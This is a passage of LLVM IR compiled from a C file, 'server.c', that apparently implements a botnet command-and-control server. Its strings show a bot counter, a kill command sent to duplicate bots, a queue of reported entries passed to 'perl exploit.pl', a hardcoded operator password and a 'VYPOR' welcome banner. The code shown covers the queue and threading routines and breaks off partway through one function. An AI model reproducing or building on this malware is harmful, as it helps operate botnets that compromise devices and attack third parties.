; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.Queue = type { %union.pthread_mutex_t, %union.pthread_cond_t, %union.pthread_cond_t, i32, i32, i32, i32, i32, %struct.QueueHead, %struct.QueueHead }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%union.pthread_cond_t = type { %struct.__pthread_cond_s }
%struct.__pthread_cond_s = type { %union.__atomic_wide_counter, %union.__atomic_wide_counter, [2 x i32], [2 x i32], i32, i32, [2 x i32] }
%union.__atomic_wide_counter = type { i64 }
%struct.QueueHead = type { %struct.QueueEntry*, %struct.QueueEntry** }
%struct.QueueEntry = type { i8*, %struct.anon.0 }
%struct.anon.0 = type { %struct.QueueEntry* }
%union.pthread_mutexattr_t = type { i32 }
%union.pthread_condattr_t = type { i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [100000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [100000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"not_processed.txt\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c"dup client\0A\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"DUP\0A\00", align 1
@.str.12 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"BUILD \00", align 1
@.str.15 = private unnamed_addr constant [21 x i8] c"build bigger then 6\0A\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.17 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@theQueue = dso_local global %struct.Queue* null, align 8
@.str.18 = private unnamed_addr constant [16 x i8] c"Queued for pl.\0A\00", align 1
@.str.19 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.21 = private unnamed_addr constant [19 x i8] c"Started le thread\0A\00", align 1
@.str.22 = private unnamed_addr constant [17 x i8] c"perl exploit.pl \00", align 1
@.str.23 = private unnamed_addr constant [18 x i8] c"Ending le thread\0A\00", align 1
@.str.24 = private unnamed_addr constant [50 x i8] c"%c]0;Bots connected: %d | Clients connected: %d%c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.25 = private unnamed_addr constant [11 x i8] c"password: \00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"1ffqfwq\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.28 = private unnamed_addr constant [49 x i8] c"\1B[31m*****************************************\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [49 x i8] c"*        WELCOME TO THE BALL PIT [VYPOR]     *\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [54 x i8] c"*     Now with \1B[32mrefrigerator\1B[31m support     *\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [52 x i8] c"*****************************************\0D\0A\0D\0A> \1B[0m\00", align 1
@.str.32 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.33 = private unnamed_addr constant [18 x i8] c"management: \22%s\22\0A\00", align 1
@.str.34 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.35 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.36 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.37 = private unnamed_addr constant [28 x i8] c"Usage: %s [port] [threads]\0A\00", align 1
@.str.38 = private unnamed_addr constant [11 x i8] c"output.txt\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.40 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.41 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.42 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.43 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.44 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local %struct.Queue* @queue_init() #0 {
  %1 = alloca %struct.Queue*, align 8
  %2 = call noalias align 16 i8* @malloc(i64 192) #8
  %3 = bitcast i8* %2 to %struct.Queue*
  store %struct.Queue* %3, %struct.Queue** %1, align 8
  %4 = load %struct.Queue*, %struct.Queue** %1, align 8
  %5 = icmp ne %struct.Queue* %4, null
  br i1 %5, label %6, label %63

6:                                                ; preds = %0
  %7 = load %struct.Queue*, %struct.Queue** %1, align 8
  %8 = getelementptr inbounds %struct.Queue, %struct.Queue* %7, i32 0, i32 4
  store i32 0, i32* %8, align 4
  %9 = load %struct.Queue*, %struct.Queue** %1, align 8
  %10 = getelementptr inbounds %struct.Queue, %struct.Queue* %9, i32 0, i32 5
  store i32 -1, i32* %10, align 8
  %11 = load %struct.Queue*, %struct.Queue** %1, align 8
  %12 = getelementptr inbounds %struct.Queue, %struct.Queue* %11, i32 0, i32 6
  store i32 0, i32* %12, align 4
  %13 = load %struct.Queue*, %struct.Queue** %1, align 8
  %14 = getelementptr inbounds %struct.Queue, %struct.Queue* %13, i32 0, i32 7
  store i32 -1, i32* %14, align 8
  %15 = load %struct.Queue*, %struct.Queue** %1, align 8
  %16 = getelementptr inbounds %struct.Queue, %struct.Queue* %15, i32 0, i32 3
  store i32 0, i32* %16, align 8
  br label %17

17:                                               ; preds = %6
  %18 = load %struct.Queue*, %struct.Queue** %1, align 8
  %19 = getelementptr inbounds %struct.Queue, %struct.Queue* %18, i32 0, i32 0
  %20 = call i32 @pthread_mutex_init(%union.pthread_mutex_t* %19, %union.pthread_mutexattr_t* null) #8
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %23

22:                                               ; preds = %17
  call void @abort() #9
  unreachable

23:                                               ; preds = %17
  br label %24

24:                                               ; preds = %23
  br label %25

25:                                               ; preds = %24
  %26 = load %struct.Queue*, %struct.Queue** %1, align 8
  %27 = getelementptr inbounds %struct.Queue, %struct.Queue* %26, i32 0, i32 1
  %28 = call i32 @pthread_cond_init(%union.pthread_cond_t* %27, %union.pthread_condattr_t* null) #8
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %25
  call void @abort() #9
  unreachable

31:                                               ; preds = %25
  br label %32

32:                                               ; preds = %31
  br label %33

33:                                               ; preds = %32
  %34 = load %struct.Queue*, %struct.Queue** %1, align 8
  %35 = getelementptr inbounds %struct.Queue, %struct.Queue* %34, i32 0, i32 2
  %36 = call i32 @pthread_cond_init(%union.pthread_cond_t* %35, %union.pthread_condattr_t* null) #8
  %37 = icmp ne i32 %36, 0
  br i1 %37, label %38, label %39

38:                                               ; preds = %33
  call void @abort() #9
  unreachable

39:                                               ; preds = %33
  br label %40

40:                                               ; preds = %39
  br label %41

41:                                               ; preds = %40
  %42 = load %struct.Queue*, %struct.Queue** %1, align 8
  %43 = getelementptr inbounds %struct.Queue, %struct.Queue* %42, i32 0, i32 8
  %44 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %43, i32 0, i32 0
  store %struct.QueueEntry* null, %struct.QueueEntry** %44, align 8
  %45 = load %struct.Queue*, %struct.Queue** %1, align 8
  %46 = getelementptr inbounds %struct.Queue, %struct.Queue* %45, i32 0, i32 8
  %47 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %46, i32 0, i32 0
  %48 = load %struct.Queue*, %struct.Queue** %1, align 8
  %49 = getelementptr inbounds %struct.Queue, %struct.Queue* %48, i32 0, i32 8
  %50 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %49, i32 0, i32 1
  store %struct.QueueEntry** %47, %struct.QueueEntry*** %50, align 8
  br label %51

51:                                               ; preds = %41
  br label %52

52:                                               ; preds = %51
  %53 = load %struct.Queue*, %struct.Queue** %1, align 8
  %54 = getelementptr inbounds %struct.Queue, %struct.Queue* %53, i32 0, i32 9
  %55 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %54, i32 0, i32 0
  store %struct.QueueEntry* null, %struct.QueueEntry** %55, align 8
  %56 = load %struct.Queue*, %struct.Queue** %1, align 8
  %57 = getelementptr inbounds %struct.Queue, %struct.Queue* %56, i32 0, i32 9
  %58 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %57, i32 0, i32 0
  %59 = load %struct.Queue*, %struct.Queue** %1, align 8
  %60 = getelementptr inbounds %struct.Queue, %struct.Queue* %59, i32 0, i32 9
  %61 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %60, i32 0, i32 1
  store %struct.QueueEntry** %58, %struct.QueueEntry*** %61, align 8
  br label %62

62:                                               ; preds = %52
  br label %63

63:                                               ; preds = %62, %0
  %64 = load %struct.Queue*, %struct.Queue** %1, align 8
  ret %struct.Queue* %64
}

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_init(%union.pthread_mutex_t*, %union.pthread_mutexattr_t*) #1

; Function Attrs: noreturn nounwind
declare void @abort() #2

; Function Attrs: nounwind
declare i32 @pthread_cond_init(%union.pthread_cond_t*, %union.pthread_condattr_t*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @queue_destroy(%struct.Queue* %0) #0 {
  %2 = alloca %struct.Queue*, align 8
  %3 = alloca %struct.QueueEntry*, align 8
  store %struct.Queue* %0, %struct.Queue** %2, align 8
  br label %4

4:                                                ; preds = %36, %1
  %5 = load %struct.Queue*, %struct.Queue** %2, align 8
  %6 = getelementptr inbounds %struct.Queue, %struct.Queue* %5, i32 0, i32 9
  %7 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %6, i32 0, i32 0
  %8 = load %struct.QueueEntry*, %struct.QueueEntry** %7, align 8
  %9 = icmp eq %struct.QueueEntry* %8, null
  %10 = xor i1 %9, true
  br i1 %10, label %11, label %43

11:                                               ; preds = %4
  %12 = load %struct.Queue*, %struct.Queue** %2, align 8
  %13 = getelementptr inbounds %struct.Queue, %struct.Queue* %12, i32 0, i32 9
  %14 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %13, i32 0, i32 0
  %15 = load %struct.QueueEntry*, %struct.QueueEntry** %14, align 8
  store %struct.QueueEntry* %15, %struct.QueueEntry** %3, align 8
  br label %16

16:                                               ; preds = %11
  %17 = load %struct.Queue*, %struct.Queue** %2, align 8
  %18 = getelementptr inbounds %struct.Queue, %struct.Queue* %17, i32 0, i32 9
  %19 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %18, i32 0, i32 0
  %20 = load %struct.QueueEntry*, %struct.QueueEntry** %19, align 8
  %21 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %20, i32 0, i32 1
  %22 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %21, i32 0, i32 0
  %23 = load %struct.QueueEntry*, %struct.QueueEntry** %22, align 8
  %24 = load %struct.Queue*, %struct.Queue** %2, align 8
  %25 = getelementptr inbounds %struct.Queue, %struct.Queue* %24, i32 0, i32 9
  %26 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %25, i32 0, i32 0
  store %struct.QueueEntry* %23, %struct.QueueEntry** %26, align 8
  %27 = icmp eq %struct.QueueEntry* %23, null
  br i1 %27, label %28, label %35

28:                                               ; preds = %16
  %29 = load %struct.Queue*, %struct.Queue** %2, align 8
  %30 = getelementptr inbounds %struct.Queue, %struct.Queue* %29, i32 0, i32 9
  %31 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %30, i32 0, i32 0
  %32 = load %struct.Queue*, %struct.Queue** %2, align 8
  %33 = getelementptr inbounds %struct.Queue, %struct.Queue* %32, i32 0, i32 9
  %34 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %33, i32 0, i32 1
  store %struct.QueueEntry** %31, %struct.QueueEntry*** %34, align 8
  br label %35

35:                                               ; preds = %28, %16
  br label %36

36:                                               ; preds = %35
  %37 = load %struct.Queue*, %struct.Queue** %2, align 8
  %38 = getelementptr inbounds %struct.Queue, %struct.Queue* %37, i32 0, i32 6
  %39 = load i32, i32* %38, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %38, align 4
  %41 = load %struct.QueueEntry*, %struct.QueueEntry** %3, align 8
  %42 = bitcast %struct.QueueEntry* %41 to i8*
  call void @free(i8* %42) #8
  br label %4, !llvm.loop !6

43:                                               ; preds = %4
  br label %44

44:                                               ; preds = %43
  %45 = load %struct.Queue*, %struct.Queue** %2, align 8
  %46 = getelementptr inbounds %struct.Queue, %struct.Queue* %45, i32 0, i32 1
  %47 = call i32 @pthread_cond_destroy(%union.pthread_cond_t* %46) #8
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %50

49:                                               ; preds = %44
  call void @abort() #9
  unreachable

50:                                               ; preds = %44
  br label %51

51:                                               ; preds = %50
  br label %52

52:                                               ; preds = %51
  %53 = load %struct.Queue*, %struct.Queue** %2, align 8
  %54 = getelementptr inbounds %struct.Queue, %struct.Queue* %53, i32 0, i32 0
  %55 = call i32 @pthread_mutex_destroy(%union.pthread_mutex_t* %54) #8
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

57:                                               ; preds = %52
  call void @abort() #9
  unreachable

58:                                               ; preds = %52
  br label %59

59:                                               ; preds = %58
  %60 = load %struct.Queue*, %struct.Queue** %2, align 8
  %61 = bitcast %struct.Queue* %60 to i8*
  call void @free(i8* %61) #8
  ret i32 1
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: nounwind
declare i32 @pthread_cond_destroy(%union.pthread_cond_t*) #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_destroy(%union.pthread_mutex_t*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @queue_empty(%struct.Queue* %0) #0 {
  %2 = alloca %struct.Queue*, align 8
  store %struct.Queue* %0, %struct.Queue** %2, align 8
  %3 = load %struct.Queue*, %struct.Queue** %2, align 8
  %4 = getelementptr inbounds %struct.Queue, %struct.Queue* %3, i32 0, i32 8
  %5 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %4, i32 0, i32 0
  %6 = load %struct.QueueEntry*, %struct.QueueEntry** %5, align 8
  %7 = icmp eq %struct.QueueEntry* %6, null
  %8 = zext i1 %7 to i32
  ret i32 %8
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @queue_full(%struct.Queue* %0) #0 {
  %2 = alloca %struct.Queue*, align 8
  store %struct.Queue* %0, %struct.Queue** %2, align 8
  %3 = load %struct.Queue*, %struct.Queue** %2, align 8
  %4 = getelementptr inbounds %struct.Queue, %struct.Queue* %3, i32 0, i32 5
  %5 = load i32, i32* %4, align 8
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %15

7:                                                ; preds = %1
  %8 = load %struct.Queue*, %struct.Queue** %2, align 8
  %9 = getelementptr inbounds %struct.Queue, %struct.Queue* %8, i32 0, i32 4
  %10 = load i32, i32* %9, align 4
  %11 = load %struct.Queue*, %struct.Queue** %2, align 8
  %12 = getelementptr inbounds %struct.Queue, %struct.Queue* %11, i32 0, i32 5
  %13 = load i32, i32* %12, align 8
  %14 = icmp sge i32 %10, %13
  br label %15

15:                                               ; preds = %7, %1
  %16 = phi i1 [ false, %1 ], [ %14, %7 ]
  %17 = zext i1 %16 to i32
  ret i32 %17
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @queue_enq(%struct.Queue* %0, i8* %1) #0 {
  %3 = alloca %struct.Queue*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca %struct.QueueEntry*, align 8
  store %struct.Queue* %0, %struct.Queue** %3, align 8
  store i8* %1, i8** %4, align 8
  br label %6

6:                                                ; preds = %2
  %7 = load %struct.Queue*, %struct.Queue** %3, align 8
  %8 = getelementptr inbounds %struct.Queue, %struct.Queue* %7, i32 0, i32 0
  %9 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %8) #8
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %12

11:                                               ; preds = %6
  call void @abort() #9
  unreachable

12:                                               ; preds = %6
  br label %13

13:                                               ; preds = %12
  %14 = load %struct.Queue*, %struct.Queue** %3, align 8
  %15 = call i32 @queue_full(%struct.Queue* %14)
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %42

17:                                               ; preds = %13
  %18 = load %struct.Queue*, %struct.Queue** %3, align 8
  %19 = getelementptr inbounds %struct.Queue, %struct.Queue* %18, i32 0, i32 3
  %20 = load i32, i32* %19, align 8
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %19, align 8
  br label %22

22:                                               ; preds = %36, %17
  %23 = load %struct.Queue*, %struct.Queue** %3, align 8
  %24 = call i32 @queue_full(%struct.Queue* %23)
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %37

26:                                               ; preds = %22
  br label %27

27:                                               ; preds = %26
  %28 = load %struct.Queue*, %struct.Queue** %3, align 8
  %29 = getelementptr inbounds %struct.Queue, %struct.Queue* %28, i32 0, i32 2
  %30 = load %struct.Queue*, %struct.Queue** %3, align 8
  %31 = getelementptr inbounds %struct.Queue, %struct.Queue* %30, i32 0, i32 0
  %32 = call i32 @pthread_cond_wait(%union.pthread_cond_t* %29, %union.pthread_mutex_t* %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %27
  call void @abort() #9
  unreachable

35:                                               ; preds = %27
  br label %36

36:                                               ; preds = %35
  br label %22, !llvm.loop !8

37:                                               ; preds = %22
  %38 = load %struct.Queue*, %struct.Queue** %3, align 8
  %39 = getelementptr inbounds %struct.Queue, %struct.Queue* %38, i32 0, i32 3
  %40 = load i32, i32* %39, align 8
  %41 = add nsw i32 %40, -1
  store i32 %41, i32* %39, align 8
  br label %42

42:                                               ; preds = %37, %13
  %43 = load %struct.Queue*, %struct.Queue** %3, align 8
  %44 = getelementptr inbounds %struct.Queue, %struct.Queue* %43, i32 0, i32 9
  %45 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %44, i32 0, i32 0
  %46 = load %struct.QueueEntry*, %struct.QueueEntry** %45, align 8
  %47 = icmp eq %struct.QueueEntry* %46, null
  br i1 %47, label %78, label %48

48:                                               ; preds = %42
  %49 = load %struct.Queue*, %struct.Queue** %3, align 8
  %50 = getelementptr inbounds %struct.Queue, %struct.Queue* %49, i32 0, i32 9
  %51 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %50, i32 0, i32 0
  %52 = load %struct.QueueEntry*, %struct.QueueEntry** %51, align 8
  store %struct.QueueEntry* %52, %struct.QueueEntry** %5, align 8
  br label %53

53:                                               ; preds = %48
  %54 = load %struct.Queue*, %struct.Queue** %3, align 8
  %55 = getelementptr inbounds %struct.Queue, %struct.Queue* %54, i32 0, i32 9
  %56 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %55, i32 0, i32 0
  %57 = load %struct.QueueEntry*, %struct.QueueEntry** %56, align 8
  %58 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %57, i32 0, i32 1
  %59 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %58, i32 0, i32 0
  %60 = load %struct.QueueEntry*, %struct.QueueEntry** %59, align 8
  %61 = load %struct.Queue*, %struct.Queue** %3, align 8
  %62 = getelementptr inbounds %struct.Queue, %struct.Queue* %61, i32 0, i32 9
  %63 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %62, i32 0, i32 0
  store %struct.QueueEntry* %60, %struct.QueueEntry** %63, align 8
  %64 = icmp eq %struct.QueueEntry* %60, null
  br i1 %64, label %65, label %72

65:                                               ; preds = %53
  %66 = load %struct.Queue*, %struct.Queue** %3, align 8
  %67 = getelementptr inbounds %struct.Queue, %struct.Queue* %66, i32 0, i32 9
  %68 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %67, i32 0, i32 0
  %69 = load %struct.Queue*, %struct.Queue** %3, align 8
  %70 = getelementptr inbounds %struct.Queue, %struct.Queue* %69, i32 0, i32 9
  %71 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %70, i32 0, i32 1
  store %struct.QueueEntry** %68, %struct.QueueEntry*** %71, align 8
  br label %72

72:                                               ; preds = %65, %53
  br label %73

73:                                               ; preds = %72
  %74 = load %struct.Queue*, %struct.Queue** %3, align 8
  %75 = getelementptr inbounds %struct.Queue, %struct.Queue* %74, i32 0, i32 6
  %76 = load i32, i32* %75, align 4
  %77 = add nsw i32 %76, -1
  store i32 %77, i32* %75, align 4
  br label %84

78:                                               ; preds = %42
  %79 = call noalias align 16 i8* @malloc(i64 16) #8
  %80 = bitcast i8* %79 to %struct.QueueEntry*
  store %struct.QueueEntry* %80, %struct.QueueEntry** %5, align 8
  %81 = icmp ne %struct.QueueEntry* %80, null
  br i1 %81, label %83, label %82

82:                                               ; preds = %78
  call void @abort() #9
  unreachable

83:                                               ; preds = %78
  br label %84

84:                                               ; preds = %83, %73
  %85 = load i8*, i8** %4, align 8
  %86 = load %struct.QueueEntry*, %struct.QueueEntry** %5, align 8
  %87 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %86, i32 0, i32 0
  store i8* %85, i8** %87, align 8
  br label %88

88:                                               ; preds = %84
  %89 = load %struct.QueueEntry*, %struct.QueueEntry** %5, align 8
  %90 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %89, i32 0, i32 1
  %91 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %90, i32 0, i32 0
  store %struct.QueueEntry* null, %struct.QueueEntry** %91, align 8
  %92 = load %struct.QueueEntry*, %struct.QueueEntry** %5, align 8
  %93 = load %struct.Queue*, %struct.Queue** %3, align 8
  %94 = getelementptr inbounds %struct.Queue, %struct.Queue* %93, i32 0, i32 8
  %95 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %94, i32 0, i32 1
  %96 = load %struct.QueueEntry**, %struct.QueueEntry*** %95, align 8
  store %struct.QueueEntry* %92, %struct.QueueEntry** %96, align 8
  %97 = load %struct.QueueEntry*, %struct.QueueEntry** %5, align 8
  %98 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %97, i32 0, i32 1
  %99 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %98, i32 0, i32 0
  %100 = load %struct.Queue*, %struct.Queue** %3, align 8
  %101 = getelementptr inbounds %struct.Queue, %struct.Queue* %100, i32 0, i32 8
  %102 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %101, i32 0, i32 1
  store %struct.QueueEntry** %99, %struct.QueueEntry*** %102, align 8
  br label %103

103:                                              ; preds = %88
  %104 = load %struct.Queue*, %struct.Queue** %3, align 8
  %105 = getelementptr inbounds %struct.Queue, %struct.Queue* %104, i32 0, i32 4
  %106 = load i32, i32* %105, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %105, align 4
  br label %108

108:                                              ; preds = %103
  %109 = load %struct.Queue*, %struct.Queue** %3, align 8
  %110 = getelementptr inbounds %struct.Queue, %struct.Queue* %109, i32 0, i32 1
  %111 = call i32 @pthread_cond_signal(%union.pthread_cond_t* %110) #8
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %113, label %114

113:                                              ; preds = %108
  call void @abort() #9
  unreachable

114:                                              ; preds = %108
  br label %115

115:                                              ; preds = %114
  br label %116

116:                                              ; preds = %115
  %117 = load %struct.Queue*, %struct.Queue** %3, align 8
  %118 = getelementptr inbounds %struct.Queue, %struct.Queue* %117, i32 0, i32 0
  %119 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %118) #8
  %120 = icmp ne i32 %119, 0
  br i1 %120, label %121, label %122

121:                                              ; preds = %116
  call void @abort() #9
  unreachable

122:                                              ; preds = %116
  br label %123

123:                                              ; preds = %122
  ret i32 1
}

; Function Attrs: nounwind
declare i32 @pthread_mutex_lock(%union.pthread_mutex_t*) #1

declare i32 @pthread_cond_wait(%union.pthread_cond_t*, %union.pthread_mutex_t*) #3

; Function Attrs: nounwind
declare i32 @pthread_cond_signal(%union.pthread_cond_t*) #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_unlock(%union.pthread_mutex_t*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @queue_deq(%struct.Queue* %0) #0 {
  %2 = alloca %struct.Queue*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.QueueEntry*, align 8
  store %struct.Queue* %0, %struct.Queue** %2, align 8
  store i8* null, i8** %3, align 8
  br label %5

5:                                                ; preds = %1
  %6 = load %struct.Queue*, %struct.Queue** %2, align 8
  %7 = getelementptr inbounds %struct.Queue, %struct.Queue* %6, i32 0, i32 0
  %8 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %7) #8
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %11

10:                                               ; preds = %5
  call void @abort() #9
  unreachable

11:                                               ; preds = %5
  br label %12

12:                                               ; preds = %11
  br label %13

13:                                               ; preds = %29, %12
  %14 = load %struct.Queue*, %struct.Queue** %2, align 8
  %15 = getelementptr inbounds %struct.Queue, %struct.Queue* %14, i32 0, i32 8
  %16 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %15, i32 0, i32 0
  %17 = load %struct.QueueEntry*, %struct.QueueEntry** %16, align 8
  %18 = icmp eq %struct.QueueEntry* %17, null
  br i1 %18, label %19, label %30

19:                                               ; preds = %13
  br label %20

20:                                               ; preds = %19
  %21 = load %struct.Queue*, %struct.Queue** %2, align 8
  %22 = getelementptr inbounds %struct.Queue, %struct.Queue* %21, i32 0, i32 1
  %23 = load %struct.Queue*, %struct.Queue** %2, align 8
  %24 = getelementptr inbounds %struct.Queue, %struct.Queue* %23, i32 0, i32 0
  %25 = call i32 @pthread_cond_wait(%union.pthread_cond_t* %22, %union.pthread_mutex_t* %24)
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %20
  call void @abort() #9
  unreachable

28:                                               ; preds = %20
  br label %29

29:                                               ; preds = %28
  br label %13, !llvm.loop !9

30:                                               ; preds = %13
  %31 = load %struct.Queue*, %struct.Queue** %2, align 8
  %32 = getelementptr inbounds %struct.Queue, %struct.Queue* %31, i32 0, i32 8
  %33 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %32, i32 0, i32 0
  %34 = load %struct.QueueEntry*, %struct.QueueEntry** %33, align 8
  store %struct.QueueEntry* %34, %struct.QueueEntry** %4, align 8
  br label %35

35:                                               ; preds = %30
  %36 = load %struct.Queue*, %struct.Queue** %2, align 8
  %37 = getelementptr inbounds %struct.Queue, %struct.Queue* %36, i32 0, i32 8
  %38 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %37, i32 0, i32 0
  %39 = load %struct.QueueEntry*, %struct.QueueEntry** %38, align 8
  %40 = getelementptr inbounds %struct.QueueEntry, %struct.QueueEntry* %39, i32 0, i32 1
  %41 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %40, i32 0, i32 0
  %42 = load %struct.QueueEntry*, %struct.QueueEntry** %41, align 8
  %43 = load %struct.Queue*, %struct.Queue** %2, align 8
  %44 = getelementptr inbounds %struct.Queue, %struct.Queue* %43, i32 0, i32 8
  %45 = getelementptr inbounds %struct.QueueHead, %struct.QueueHead* %44, i32 0, i32 0
  store %struct.QueueEntry* %42, %struct.QueueEntry** %45, align 8
